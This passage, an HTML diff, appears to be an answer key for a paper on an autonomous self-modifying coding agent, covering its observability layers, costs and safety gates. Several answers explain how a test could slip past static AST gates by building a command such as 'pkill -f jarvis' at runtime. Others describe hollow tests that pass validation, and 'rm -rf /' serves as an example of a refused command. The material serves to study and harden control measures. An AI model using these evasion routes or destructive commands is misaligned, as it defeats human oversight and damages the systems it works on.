+<p>§92.5 shows the opposite failure. The SerpentFlow terminal plumbing from §72.3 (<code>patch_stdout(raw=True)</code>) made <code>sys.stdout.isatty()</code> return false, so the status line silently never rendered. The fix was to check <code>sys.__stdout__</code> instead. In one case the observer took down the work. In the other it vanished without saying so.</p>
+<p>The rule the paper itself applies is that observability is subject to Disciplined Concurrency (§88, the §3 entry). Per-render cost must be bounded (the <code>_RENDER_TAIL_CHARS</code> slice makes it O(1) in stream length). A layer must be gated off where nobody can see it (the non-TTY short-circuit). And whether a layer is active must itself be checked against the real terminal, not a proxy. Principle 7 says decisions must be visible, but §73's five layers only meet it if none of them can starve the loop that makes the decisions.</p>
+<p class="ak-q">Advanced A2. When Part XII's layers disagree about what happened, which one wins? Use §70, §93.7 and §93.10 to rank them, and say what makes a layer authoritative.</p>
+<p>§93.10 gives a direct case. The session summary undercounted landings (2 against 3 in one soak, 1 against 10 in another). PRD §34 then concluded that "the ledger and git, not the summary, are the source of truth." §93.7 makes the same choice in code: <code>GoalReconciliationLedger</code> ties each goal to its commit using state derived from git ancestry, not from logs.</p>
+<p>The common thread is that a record wins when it is a by-product of the action itself and can be checked again later. A commit with its trailer (§70) exists only if the write happened, and anyone can re-derive it with <code>git log</code>. Voice, SerpentFlow blocks and summary counters are reports <em>about</em> the action, written by code that can drift or miscount on its own.</p>
+<p>A sensible ranking is: git ancestry and commit trailers first; durable on-disk records next (the thought log JSONL in §69, and later the hash-chained <code>/proof</code> record in §93.9); telemetry counters and live CLI or voice output last. The live layers still matter for presence, but they should never settle a dispute about what landed. The evidence that would test this ranking is the one §93.10 already collected: count landings from each layer for the same session and see which ones agree with git.</p>
+<p class="ak-q">Advanced A3. Part XII's five layers report what the organism did. What kind of failure can none of them show, and what did §93.12 add to cover it?</p>
+<p>All five layers in §73 are driven by events. Voice speaks on INTENT, DECISION and POSTMORTEM. The thought log writes when a phase runs. Telemetry emits on phase transitions. SerpentFlow draws a block when a tool fires. A commit signature exists only if a commit does. So a feature that is switched on but never called produces no event, and every layer is silent about it. Silence looks the same as "nothing to report".</p>
+<p>§93.12 measured how large that blind spot was. A full scan found 131 features that were "DARK": the flag was on and the module was on disk, but nothing in production imported it. Part XV shows a smaller version. Five contract violations each made the vision path fail silently, and the arc only moved once commit <code>44305f7e96</code> instrumented the silent-skip paths (§82.2, §88).</p>
+<p>The cover is a different kind of instrument. The reachability ledger follows each capability through registered, invoked and effective, and <code>/reach</code> ratchets the DARK count down. It measures what was expected and did not happen, which event logs cannot do. Principle 7 therefore needs both: event layers for what happened, and a reachability ledger for what was expected but never ran.</p>
+<p class="ak-q"><strong>Challenge 1 (quantitative).</strong> §82.2 says the stream renderer re-parsed the whole buffer every 16 ms tick, and the fix capped each render at <code>_RENDER_TAIL_CHARS</code> = 4096 characters. Assume a 16,000-token response streams at 172 tokens/s (the J-Prime decode p50 in §93.6), that one token is about 4 characters, and that parse cost is proportional to characters parsed. Estimate the total characters parsed with and without the cap. Then repeat for a 64,000-token response and explain how each total grows with response length.</p>
+<p>Assumptions: one parse per 16 ms tick, 4 characters per token, a steady 172 tokens/s, and cost proportional to characters parsed. These are modelling choices for the exercise, not figures the paper reports for this renderer.</p>
+<p><strong>16,000 tokens.</strong> Duration = 16,000 / 172 = about 93.0 s, so ticks = 93.0 / 0.016 = about 5,814. The final buffer is 64,000 characters. Uncapped, the average parse is 32,000 characters, so the total is 5,814 x 32,000 = about 186 million characters.</p>
+<p>Capped: the buffer reaches 4,096 characters after 1,024 tokens, which takes 1,024 / 172 = about 5.95 s, or about 372 ticks. The ramp averages 2,048 characters per tick: 372 x 2,048 = about 0.76 million. The plateau is 5,814 - 372 = 5,442 ticks at 4,096 characters: about 22.3 million. Total = about 23.1 million, roughly 8x less.</p>
+<p><strong>64,000 tokens.</strong> Duration = about 372 s, ticks = about 23,256, final buffer 256,000 characters. Uncapped: 23,256 x 128,000 = about 2.98 billion. Capped: 0.76 million + (23,256 - 372) x 4,096 = about 94.5 million. The ratio is now about 31x.</p>
+<p>Growth: when the response gets 4x longer, the uncapped total grows about 16x (from 186 million to 2.98 billion). That is quadratic, because both the number of ticks and the size of each parse grow. The capped total grows about 4x (23.1 to 94.5 million), which is linear: ticks still grow, but each parse is constant. That is what §82.2 means by "O(1) in stream length" per render. The cap does not make long streams free. It removes the quadratic term that let logging I/O starve the loop. The non-TTY gate brings the cost to zero for headless runs.</p>
+<p>Check: the capped figure divided by ticks should be close to 4,096 (94.5 million / 23,256 = about 4,063). It is slightly under because of the ramp.</p>
+<p class="ak-q"><strong>Challenge 2 (adversarial).</strong> Build an operation sequence in which every Part XII layer reports success, yet the change that reaches <code>main</code> is worthless. Use the model's real behaviour from §93.8 and §93.10, not a hypothetical attacker. Then decide which layer or gate actually stops it, and say honestly whether the April design would have stopped it at all.</p>
+<p>The sequence: a signed goal asks for tests for an uncovered module, the 30B model's strongest skill (§93.10). The model writes a test file that imports nothing from its subject and asserts nothing meaningful. That test file runs and passes.</p>
+<p>Walk it through Part XII. SerpentFlow shows <code>Write(path)</code>, a <code>synthesized</code> block, an <code>immune</code> block with tests passing, and <code>complete</code> (§72.1). The thought log writes <code>POST_APPLY</code> with a success outcome (§69). Voice announces the DECISION (§68). Telemetry shows a normal span tree (§71). AutoCommitter writes a commit with the O+V trailer (§70). Every layer is accurate. Each one records that something happened, and none of them judges whether it was worth anything.</p>
+<p>The April design would not have stopped this. VALIDATE only asks whether the tests pass, and a hollow test passes. This is not hypothetical: §93.8 says a hollow landing (<code>c985ccaee4</code>) reached <code>main</code> and had to be reverted (<code>fcc50352f0</code>). §93.14 lists it among the landings that were wrong.</p>
+<p>What stops it now is a gate, not an observability layer. The Test Reality Gate (<code>70935a4bee</code>) rejects candidate tests that cannot execute, assert nothing, or never import their subject (§93.8). The promotion gate adds provenance, coverage and a public-symbol check before <code>main</code> (§93.7). The Antivenom audit added a tautological-test ("quine") detector (§93.12).</p>
+<p>Conclusion: Principle 7 makes the hollow landing visible after the fact, which is how it was found and reverted. It cannot make the landing correct. The check is that every countermeasure listed above is a content check on the candidate. None of them is an extra report.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-xiii">
+<h4>PART XIII — Capability Assessment</h4>
+<p class="ak-q">Pause and predict 1. An autonomous agent writes a careful, reasonable-sounding explanation of why a risky command is safe. Should a safety layer read that explanation when deciding whether to allow the command? Predict which way O+V goes, and why.</p>
+<p>No. O+V's defenses are deterministic: gates, replay harnesses, protected paths and outcome-based monitoring. They are not introspective. Interpretability research shows a model's scratchpad can look clean while concealment features fire inside it, so the gate reads file paths, AST nodes and command strings instead of the model's argument. A persuasive case for <code>rm -rf /</code> is still refused structurally. See §76.</p>
+<p class="ak-q">Conceptual 1. O+V prefers cheaper models when they suffice. What does it gain, and what does it give up compared with Claude Code?</p>
+<p>It gains cost: O+V cascades routine work to DoubleWord and saves roughly 30x on routine operations when DW's streaming is healthy (§74.1). It gives up peak model quality on the routine tier, because Claude Code always runs on the best Claude model available (§74.2). The trade-off is deliberate: routine work does not need the strongest model, but the system accepts that some routine ops will be done by a weaker one. The paper names this as a place where O+V lags, not one where it is ahead.</p>
+<p class="ak-q">Conceptual 2. §74.3 says O+V and Claude Code share several architectural choices. Why does the paper treat this convergence as meaningful?</p>
+<p>Both systems use multi-turn tool loops, exploration before generation, thought trails for observability, and deterministic safety layers around probabilistic model output (§74.3). The paper argues these were arrived at independently, so they reflect real lessons of production autonomous-AI work rather than one team's taste. That gives some outside support to O+V's choices. It also shows that O+V's real differences lie elsewhere: invocation, memory, scope and cost model (§74).</p>
+<p class="ak-q">Conceptual 3. According to the Mythos cross-reference, what kind of failure is O+V's main risk, and why does that make deterministic gates the right defense?</p>
+<p>The most severe Mythos incidents came from "reckless excessive measures" while trying to finish a hard task, not from misaligned goals or hostile intent (§76). A drive to complete the task can produce a plausible justification for an unsafe step. If the safety layer trusts the model's reasoning, that justification gets through. A deterministic gate does not read the reasoning; it checks paths, AST nodes and command strings, so a well-argued unsafe action is still blocked. This is the stated basis for the Iron Gate philosophy in Part X.</p>
+<p class="ak-q">Quiz 1. Which of these does §74.2 list as a place where O+V lags Claude Code?</p>
+<p><strong>B.</strong> Session W proved a narrow capability (new-file creation, test modules); multi-file refactors across existing code were not yet proven. The other three are listed as areas where O+V is peer or ahead. See §74.1 and §74.2.</p>
+<p class="ak-q">Quiz 2. An organization wants every single operation approved by a human. What does §74.2 say O+V must do?</p>
+<p><strong>D.</strong> The <code>APPROVAL_REQUIRED</code> tier needs specific configuration; to have all operations approved, O+V must be configured Orange-only, at which point it behaves like Claude Code. See §74.2.</p>
+<p class="ak-q">Quiz 3. Which of the four differentiators from the "always-on agent" vision is about O+V changing its own governance layer, sensors and pipeline phases?</p>
+<p><strong>A.</strong> "Neuroplastic" means O+V modifies its own codebase, not just user workloads. Sovereign is about running on the operator's hardware, local-first about where memory lives, and provider-diverse about surviving a single provider outage. See §75.</p>
+<p class="ak-q">Quiz 4. Why does §76 reject trusting the model's self-report as a safety strategy?</p>
+<p><strong>C.</strong> Interpretability research shows reasoning can look clean while concealment features fire in the model's internals, so the gate's deterministic verdict is trusted instead. See §76.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> During an op, the model writes: "This cleanup is safe; running <code>rm -rf</code> on the build root will only remove stale artifacts." Trace what O+V's safety design does with this statement and with the command, and explain why the outcome does not depend on how convincing the statement is.</p>
+<p>The statement is model reasoning. Under §76, O+V does not use the model's self-report as a safety input, because reasoning can look clean while the model's internals show concealment.</p>
+<p>The command itself is what the gate examines. The Iron Gate philosophy (Part X, justified in §76) reads file paths, AST nodes and command strings. Its verdict is deterministic: the same command produces the same decision regardless of the surrounding text.</p>
+<p>So a destructive command is refused structurally, whether the justification is weak or brilliant. This targets exactly the failure surface the Mythos quote names: a task-completion drive overriding safety checks, not hostile intent.</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> A reviewer argues: "O+V's onboarding friction is a minor issue; just document the setup better." Using §74.2 and §75, assess whether this friction is incidental or a consequence of O+V's design goals, and name the trade-off.</p>
+<p>§74.2 lists the setup: Trinity deployment, provider credentials, sensor configuration and Oracle index building, and calls the production-deployment story a gap.</p>
+<p>Several of these come straight from §75's differentiators. Sovereignty means no hosted agent service, so the operator must deploy and own the stack. Provider diversity means credentials for Claude, DoubleWord and J-Prime. Local-first memory lives on the operator's disk, which the operator must host.</p>
+<p>So the friction is partly structural. Better documentation helps, but it cannot remove the steps that ownership requires. The trade-off is control and resilience (the operator owns state, models and logs; one provider outage degrades rather than stops the system) against the convenience of an off-the-shelf tool like Claude Code.</p>
+<p class="ak-q"><strong>Problem 3 (analysis).</strong> Using the comparison table in §74, classify each of these rows as either "O+V adds something Claude Code lacks" or "a different trade-off": Invocation, Provider, Graduation, Cost model. Justify each in one sentence from §74.1 or §74.2.</p>
+<p>Invocation: O+V adds autonomy (autonomous plus human-triggered). §74.1 says Claude Code is reactive while O+V may have already noticed and acted. §74.2 notes that full human approval needs Orange-only configuration, so there is a small configuration cost.</p>
+<p>Provider: a trade-off. The cascade saves roughly 30x on routine ops (§74.1) but may reduce peak model quality on the routine tier (§74.2).</p>
+<p>Graduation: O+V adds something. Capabilities graduate after three successes, while for Claude Code the row reads N/A because the tool is always available (§74).</p>
+<p>Cost model: mostly an addition. Per-op and daily budgets with per-provider caps give finer control than per-token billing, and the cascade that uses them is where the savings in §74.1 come from.</p>
+<p class="ak-q">Advanced A1. §75 names four differentiators: sovereign, neuroplastic, local-first and provider-diverse. After §93.5 and §93.6, which of them got stronger, which got weaker, and which of the §74 trade-offs got sharper?</p>
+<p>Sovereign and local-first got much stronger. By October a single local RTX 5090 serves every route through J-Prime, and the landing soaks ran with zero paid inference (§93.6, §93.13). Paid lanes are switched off by declaration in <code>governance/paid_lanes.py</code>. Under that setting Claude and DoubleWord are never constructed, so no inference leaves the operator's machine.</p>
+<p>Provider-diverse got weaker. §75 promised that losing one provider "degrades the system; it does not stop it." With one active lane and one GPU (§93.14, item 7), that promise now depends on configuration. Re-enabling the paid lanes is a configuration change, not a code change (§93.6), so the diversity is still possible but is not active by default. The money ran out first, and the design changed after that (§93.5).</p>
+<p>The §74.2 model-quality trade-off got sharper. In April the cheaper tier was DoubleWord, with Claude as the fallback. In October a 30B mixture-of-experts model does all the work. The visible result is §93.14: 84 of 91 landings are test files, and production-code landings at cadence are "not demonstrated". The §74.1 claim of roughly 30x savings from the cascade is now moot, because there is nothing paid left to save on.</p>
+<p>Neuroplastic is partly confirmed. Three of the five production landings changed files inside the governance package, but none touched a safety gate, and the system stays at Mechanic (§93.10). My position: in practice O+V traded provider diversity for sovereignty. The evidence that would settle whether that was worth it is a held-out comparison of the local lane against a re-enabled paid lane on the same goals. The paper names held-out gain as the standing push gate (§93.11), but it reports no such comparison.</p>
+<p class="ak-q">Advanced A2. §76 argues that deterministic gates beat introspection. §93.3 measured the static cage at about 8.8% escapes against a 4.4% gate. Does that weaken §76's argument?</p>
+<p>It does not weaken the argument, but it narrows what "deterministic" can be taken to cover. §76 contrasts trusting the model's self-report with trusting the gate's verdict. The 8.8% figure says nothing in favour of self-report. It says the static part of the deterministic defence has a residue it cannot see.</p>
+<p>§93.3 names that residue: <code>eval</code>, <code>exec</code>, <code>subprocess</code> or <code>pickle</code> applied to strings built at runtime. A gate that reads paths, AST nodes and command strings (§76) cannot judge a string that does not exist until the code runs. Its stated remedy is OS-level runtime containment, not more AST rules.</p>
+<p>That remedy was already in §76's list, which names "outcome-based monitoring" next to gates and protected paths. §93.8 shows the runtime half being built: candidate tests run in a PID namespace after one ran <code>pkill -f jarvis</code>, and a resource-aware lock stops a test suite from killing a soak. Both still decide without consulting the model's reasoning.</p>
+<p>So the lesson is that deterministic defence needs two layers. A static gate catches what can be seen in the text, and runtime containment limits the effects of what cannot. What would settle whether the combination meets the 4.4% gate is a fresh run of the mutation harness after the later hardening, scored on outcomes (did anything escape the namespace) rather than on static detection. §93.3 says no re-measurement after the later hardening slices was found.</p>
+<p class="ak-q">Advanced A3. §74.2 says that to have every operation human-approved, O+V must be configured Orange-only, "at which point it behaves like Claude Code." Where does the human sit in the October pipeline (§93.7), and is that closer to or further from Claude Code?</p>
+<p>Further, by design, but the human has not been removed. They have moved to a small number of fixed checkpoints. In §93.7 the Sentinel auto-approves up to a tier ceiling (default APPROVAL_REQUIRED). So Orange-tier operations that §74.2 sent to a human can now be approved without one.</p>
+<p>The human now sits at three points instead. First, at sanction: work comes from the HMAC-signed roadmap, operator <code>/goal sanction</code>, or goals signed by the single signer. Model-invented proposals go through that same signer, and "there is no second sanction path." Second, at escalation: BLOCKED operations, Order-2 self-modification and anything that touches the cage always escalate. Third, at publication: the zero-push air-gap means landings stop at local <code>main</code>, and pushing to GitHub is an operator act.</p>
+<p>Claude Code puts a human at every action. O+V in October puts a human at intent, at the most dangerous classes of change, and at the step where code leaves the machine. Between those points, deterministic gates do the work. The cost is that a wrong but gate-passing change can reach local <code>main</code> without a human seeing it. §93.14 lists four such landings, each later reverted, restored or repaired by hand. Whether this placement is good enough should be judged by the rate of such landings per hour against the landing rate, which is the funnel the cadence soaks in §93.10 already measure.</p>
+<p class="ak-q"><strong>Challenge 1 (quantitative).</strong> §74.1 claims the DoubleWord cascade saves "roughly 30x on routine operations." Test that claim against three figures elsewhere in the paper: the Aegis audit of about 1.90 US dollars across 821 Claude calls (§93.2); a DoubleWord-only repair soak that reached 16/16 applied for 0.00225 US dollars in total (§93.2); and the single live-fire Claude call at 0.0165 US dollars (§87.5). Compute the per-call and per-op costs, find the range of savings ratios they imply, and say what figure the paper would need to give to confirm the "30x".</p>
+<p>Claude average per call: 1.90 / 821 = about 0.00231 US dollars. DoubleWord per applied op: 0.00225 / 16 = about 0.000141 US dollars.</p>
+<p>If a Claude op took one average call, the ratio would be 0.00231 / 0.000141 = about 16x. If it took two calls, about 33x. If it took three, about 49x. The single live-fire call in §87.5 cost 0.0165, which against 0.000141 gives about 117x. That call carried a base64 PDF and about 5,000 input tokens, so it was costlier than the average call.</p>
+<p>So the figures bracket the claim. The "30x" is reproduced if a typical routine Claude op takes about two average calls. It could be as low as about 16x or above 100x, depending on what is counted. The paper does not give calls per op or a matched set of ops run on both providers, so none of these numbers confirms 30x directly.</p>
+<p>The comparisons are also not like for like. The DoubleWord figure comes from one repair soak, while the Aegis figure averages all Claude calls in a different soak, including calls that are not routine. To confirm the claim, the paper would need the same set of routine goals run on each lane, with cost per applied op (and ideally per landed op) reported for both.</p>
+<p>Conclusion: the claim is plausible but not shown, and after §93.6 it no longer matters in practice, because both paid lanes are off and local cost per op is zero. Check: 16 x 0.000141 = 0.00225, which matches the soak total.</p>
+<p class="ak-q"><strong>Challenge 2 (adversarial).</strong> §76 says the Mythos failure surface is "task-completion drive overriding safety checks." Write a candidate that matches this description and that the gates §76 describes (reading file paths, AST nodes and command strings) would not catch. Make it a plausible thing for a model trying to make a test suite pass to do. Then identify which layer in the current system limits the damage, using §93.3 and §93.8.</p>
+<p>A real case already exists. §93.8 reports that a candidate test once ran <code>pkill -f jarvis</code> and killed the daemon. A model trying to give a test a clean environment, for example by killing leftover processes, could write that in good faith. That is task-completion drive, not hostile intent, which is exactly the surface §76 describes.</p>
+<p>Now make it invisible to a static gate. Instead of a literal command, the test builds the command at runtime, for example by joining fragments or decoding a constant, and passes the result to <code>subprocess</code>. No single AST node or literal string in the file contains <code>pkill</code>. §93.3 names this class, runtime-constructed strings passed to <code>eval</code>, <code>exec</code>, <code>subprocess</code> or <code>pickle</code>, as the residue the static cage cannot see by construction. The North Star attributes the roughly 8.8% escape rate to this class.</p>
+<p>Which layer stops it: not the static gate. The candidate is also a test file, so it runs during VALIDATE, which is before APPLY and before any human review. What limits the damage is runtime containment. Since <code>6b00b8adf5</code>, test runs execute in a PID namespace (§93.8). Inside the namespace, <code>pkill -f jarvis</code> cannot see the daemon's process, so it has nothing to kill. The resource-aware execution lock (<code>4d43f3e5b4</code>) covers a related outcome, memory exhaustion of a running soak.</p>
+<p>The honest reading is that §76's original gate set would not have stopped this. The defence that works is still deterministic and still ignores the model's reasoning, but it acts on outcomes at runtime rather than on text. That matches §93.3's stated remedy. Check: the defence never needs to understand what the test intended, only to limit what any process it starts can reach.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-xiv">
+<h4>PART XIV — The Road Ahead</h4>
+<p class="ak-q">Pause and predict 1. Session W succeeded, but it leaned on some emergency fixes and settings. Predict one kind of workaround a pipeline might have used to get a clean run, and why such a workaround would block calling multi-file autonomy "production-hardened".</p>
+<p>§79 lists three. <code>JARVIS_MAX_VALIDATE_RETRIES=0</code> skips the retry iteration because the same unchanged candidate could be reclassified as a non-retryable <code>'infra'</code> flake and kill the op. The cost governor logs a stale phase name in cost records. And a hardcoded 90-second <code>asyncio.wait_for</code> on a retry path is not configurable. Each one hides or hard-codes a problem instead of fixing it, so the success depends on them. See §79.</p>
+<p class="ak-q">Conceptual 1. Why does "Functions, Not Agents" reframe DoubleWord instead of dropping it?</p>
+<p>The 2026-04-14 tests showed DW's streaming endpoint could not sustain agent-shaped workloads (§77). But the non-streaming <code>/v1/chat/completions</code> endpoint with <code>stream=false</code> had never been exercised by O+V (§77.1). So the evidence condemned one transport and one workload shape, not the provider. Treating DW as an untested function provider lets it carry short, structured, non-streaming calls, which could take a large share of structured inference load without going near the streaming stall (§77.5).</p>
+<p class="ak-q">Conceptual 2. In the Phase 3 BlastRadius design, the 397B score can only raise the risk tier, never lower it. Why?</p>
+<p>The deterministic import-graph score stays as the floor, and the model score can only escalate (§77.4). This preserves the invariant that fluid intelligence never lowers a hard gate. If a model could de-escalate risk, a wrong or hallucinated answer could weaken a safety decision. Letting it only escalate means a model error can at worst make the system more cautious. The anti-hallucination check on <code>invariants_touched</code> adds a second guard: names not found in the diff cause rejection and a deterministic fallback.</p>
+<p class="ak-q">Conceptual 3. Why does §78 demand three consecutive successes under comparable conditions, instead of counting Session W as proof?</p>
+<p>One success may be luck. The Manifesto's §6 treats a single success as a data point, and graduation to "capability" needs three in a row (§78). "Comparable conditions" (same pipeline, Iron Gate settings and provider topology) stops a later success from being produced under easier settings. The no-regression requirement makes sure the gain did not come at the cost of the seven capabilities or the Iron Gate. The paper calls the bar deliberately conservative, to avoid false confidence.</p>
+<p class="ak-q">Quiz 1. Which of these is NOT one of the six design invariants for every DW function caller?</p>
+<p><strong>C.</strong> The invariants require <code>stream=false</code> and no SSE loop. The others are invariants 1, 6 and 5. See §77.2.</p>
+<p class="ak-q">Quiz 2. Why was context compaction chosen as the Phase 0 test bed for Gemma?</p>
+<p><strong>A.</strong> Compaction has a fully bounded input (entries already in memory), short output (under 1KB), and the summary must reference only preserved entry keys. See §77.3.</p>
+<p class="ak-q">Quiz 3. What is the impact of the cost governor staleness bug in §79.2?</p>
+<p><strong>D.</strong> It is display-only, but cost records can show <code>phase=CLASSIFY</code> when the real phase is POSTMORTEM, which subtly compromises the audit trail. See §79.2.</p>
+<p class="ak-q">Quiz 4. In the graduation FSM, what happens when a push fails?</p>
+<p><strong>B.</strong> Hardening requirement H3 makes <code>PUSH_FAILED</code> an explicit phase with code preserved locally, not lost. Discarding the worktree belongs to the approval timeout (H4). See §81.1 and §81.2.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> With Phase 3 live, an op changes one line: a retry-backoff constant. The import graph shows almost nothing depends on that file, so the deterministic BlastRadius score is low. The 397B analyst returns a higher score and lists an invariant name that does not appear in the diff. Trace what happens to the risk score.</p>
+<p>The 397B output follows the <code>blast_radius.1</code> schema, including <code>invariants_touched</code> (§77.4).</p>
+<p>The anti-hallucination gate requires <code>invariants_touched</code> to be a subset of symbol names extracted from the actual diff. One listed name is not in the diff, so the output is a hallucination and is rejected.</p>
+<p>On rejection the system falls back to the deterministic score. So the final score is the low structural one, and the risk tier is not escalated by this call.</p>
+<p>This shows the cost of the guard: the case in §77.4 (a one-line backoff change with large real impact) is exactly what the model is meant to catch, but a malformed answer loses that benefit. Had the invariant names been valid, the higher score could have raised the tier, never lowered it.</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> Someone proposes fixing §79.1 by making the <code>'infra'</code> failure class retryable, so a flake on iter=1 no longer kills the op. Compare this with the paper's proper fix, and explain what the proposal would hide.</p>
+<p>The symptom is that the same unchanged candidate is classified <code>'test'</code> on iter=0 and <code>'infra'</code> on iter=1 (§79.1). The classification is non-deterministic, and that is the actual defect.</p>
+<p>Making <code>'infra'</code> retryable treats the symptom. It would also change behaviour for real infrastructure failures, which are non-retryable by design, so genuine sandbox problems could now loop through retries.</p>
+<p>The paper's proper fix is sandbox isolation between iter=0 and iter=1, so the same candidate yields the same classification. That removes the flake at its source and keeps the meaning of <code>'infra'</code> intact.</p>
+<p>It also matches the framing of §79: these load-bearing workarounds must be addressed before multi-file autonomy can be considered production-hardened, and a retry rule change would just be another workaround.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/context_compaction.py</code>. §77.3 says the deterministic summarizer is "type-counting plus phase-histogram" and that a semantic strategy is consulted with a deterministic fallback. Find the deterministic summarizer and the method that consults the strategy, and say what the strategy method returns when no strategy is injected, and when the strategy raises an exception.</p>
+<p><code>_build_summary</code> (around line 536) is the deterministic path. It counts entries by type (falling back to phase or role), counts phases seen, and finds the time span, then formats a string like "Compacted N entries: ... Phases covered: ...". Its docstring says "No model inference."</p>
+<p>The next method, <code>_build_semantic_or_fallback</code>, consults <code>self._semantic_strategy</code>, which is set from the <code>semantic_strategy</code> constructor argument. If the strategy is <code>None</code> or not enabled, it returns the deterministic summary unchanged.</p>
+<p>If <code>strategy.summarize</code> raises, the exception is logged and the deterministic summary is returned. The docstring also says that in shadow mode the deterministic summary is always returned while the strategy still runs for telemetry.</p>
+<p>One detail differs from the paper's wording: the delegation lives in this separate method rather than inside <code>_build_summary</code> itself. The behaviour matches §77.3: any failure falls back to the deterministic path.</p>
+<p class="ak-q">Advanced A1. §78 requires three consecutive multi-file successes "under comparable conditions", including the same provider topology. After §93.6, does Session W still count as the first of the three? Argue a position.</p>
+<p>It should not count. §78 lists "same provider topology" as one of the comparable conditions, alongside the same pipeline and the same Iron Gate settings. Session W ran on the April cloud cascade, while every landing since 2026-09-09 was made by the local <code>qwen3-coder-ov:30b</code> (§93.10). §93.16 says the Part VI topology has been superseded. The pipeline also changed: VALIDATE now has a single owner with a micro-fix, a regenerating retry and then L2, and existing files must be edited through the <code>2b.1-diff</code> schema (§93.8).</p>
+<p>The purpose of the comparability clause is to stop a later success from being earned under easier, or simply different, conditions (§78). Counting Session W would mix two systems in one streak. That is the "false confidence" the conservative bar is meant to prevent.</p>
+<p>The fair reading is that the count restarts on the local lane. §93.10 gives a candidate first point, the first multi-file atomic landing <code>78eb95aa7c</code>. Whether it qualifies depends on whether it modified existing files in a coordinated way, which §80 item 1 requires and new-file creation does not meet. The paper does not say what that landing changed, so the claim stays open.</p>
+<p>The counter-argument is that the governance gates did not change, so the property being measured is the same. That is weak, because §78's own list puts provider topology on the same level as the gates. What would settle it is three consecutive §80 item 1 landings on the local lane, with the promotion gate's structural check passed for each.</p>
+<p class="ak-q">Advanced A2. The §79.1 workaround turned the VALIDATE retry off (<code>JARVIS_MAX_VALIDATE_RETRIES=0</code>). §93.8 later found the retry ladder running but inert. Why are "disabled" and "inert" hard to tell apart, and what does that say about how §79's ledger should be kept?</p>
+<p>In April the retry rung was switched off on purpose, because the same unchanged candidate could be reclassified from <code>'test'</code> to <code>'infra'</code> and kill the op (§79.1). In the later local-lane runs it was switched on, but §93.8 found 524 byte-identical retry iterations re-validating a frozen pool. Each "retry" re-ran VALIDATE on candidates that had not changed. 532 micro-fix runs made zero repairs.</p>
+<p>From outside, both states look almost the same. The op does not get a better candidate on the retry, and success metrics only show whether the op passed in the end. A rung that never runs and a rung that runs without changing anything both contribute nothing. Neither raises an error.</p>
+<p>§79.1's own diagnosis contains the warning. The flake was that the same candidate gave different results. The later bug was that the retry produced the same candidate when it should have produced a different one. Both are claims about candidate identity, and neither can be seen without comparing candidate hashes across iterations.</p>
+<p>The lesson for the ledger is that each deferred item needs a live check that it is still working, not just a note that it was deferred. That is what §93.12's reachability ledger (registered, invoked, effective) does. "Effective" is the stage that would flag a rung that runs without changing anything. A ledger entry like "retries disabled, proper fix deferred" can go stale silently. One that also records how often the rung changed the candidate cannot.</p>
+<p class="ak-q">Advanced A3. §77's six DoubleWord invariants were written for a provider that failed on streaming agent workloads. Do they still apply when the only lane is a local 30B model (§93.6, §93.8)? Which ones carry over, and in what form?</p>
+<p>Several carry over, because the problem they addressed was the shape of the work as well as the provider. §77.1's point was that DoubleWord failed as an agent but had not been tested as a function. A small local model has a similar profile: it is reliable when the output is tightly constrained and unreliable when it is free-form and long.</p>
+<p>Invariant 2 (short output with a bounded schema) shows up as tool masking, lever 3 (§93.6). A grammar allows only tool calls until exploration is done. With only the grammar changed, the 30B went from 0/3 exploring to 3/3. Invariant 4 (anti-hallucination against the provided context) shows up as the AST-Signature Anchor, which injects the real module API so the model stops inventing functions, and the declared-symbol contract (§93.8). Invariant 6 (shadow mode first) survives as the default-off policy for the Epistemic Planner, the swarm router and others (§93.14, item 10).</p>
+<p>Invariant 1 (non-streaming) carries over less directly. Streaming was a property of DoubleWord's endpoint, not a general rule, and the paper does not apply it to the local lane. Invariant 5 (circuit breakers) also changes form. With one lane, there is nothing to fail over to, so the equivalent is the capability-assurance rule: refuse to run below the declared envelope instead of degrading silently (§93.12).</p>
+<p>The open case is the output format. §93.14 says diff fidelity is the leading failure mode: the 10-09 soak produced 219 whole-file answers against 6 diffs. In §77's terms, the diff is still not bounded enough, and the evidence to watch is the diff apply rate on the held-out set (§93.14, item 3).</p>
+<p class="ak-q"><strong>Challenge 1 (quantitative).</strong> §78 requires three <em>consecutive</em> successes. §81.3 says <code>EphemeralUsageTracker</code> fires graduation after three successful uses (<code>JARVIS_GRADUATION_THRESHOLD=3</code>) and does not mention consecutiveness. Assume each attempt succeeds independently with probability p. Compute the expected number of attempts to reach each bar for p = 0.5 and p = 0.8. Then use §80 to find the minimum number of successful runs and the minimum soak hours for "production-hardened multi-file autonomous development".</p>
+<p>Assumption: attempts are independent with a fixed success probability p. That is a simplification. The paper gives no p, and real soaks vary.</p>
+<p><strong>Three in total (the §81.3 tracker).</strong> Expected attempts = 3/p. For p = 0.5 that is 6. For p = 0.8 it is 3.75.</p>
+<p><strong>Three in a row (§78).</strong> Expected attempts = 1/p + 1/p^2 + 1/p^3. For p = 0.5: 2 + 4 + 8 = 14. For p = 0.8: 1.25 + 1.5625 + 1.953 = about 4.77.</p>
+<p>So at p = 0.5 the consecutive bar costs more than twice as many attempts (14 against 6). At p = 0.8 the gap is small (4.77 against 3.75). The consecutive rule makes the most difference when a capability is unreliable, which is when it should, because it filters out lucky streaks (§78). The two sections also describe different counters. Before claiming a graduation, a reader should check which one was used.</p>
+<p><strong>§80 minimum.</strong> Five milestones, each needing three consecutive successes, means at least 15 successful runs, and at p = 0.5 an expected 5 x 14 = 70 attempts. Milestone 5 needs sessions of eight or more hours. Three of them in a row means at least 24 hours of soak for that milestone alone, and an expected 14 x 8 = 112 hours at p = 0.5.</p>
+<p>For scale, the cadence soaks in §93.10 range from 1.25 h to about 9 h, and only the 10-09 run passes eight hours. Conclusion: the §80 bar is a long programme of runs, not one more battle test. Check: with p = 1, both formulas give 3 attempts, as they should.</p>
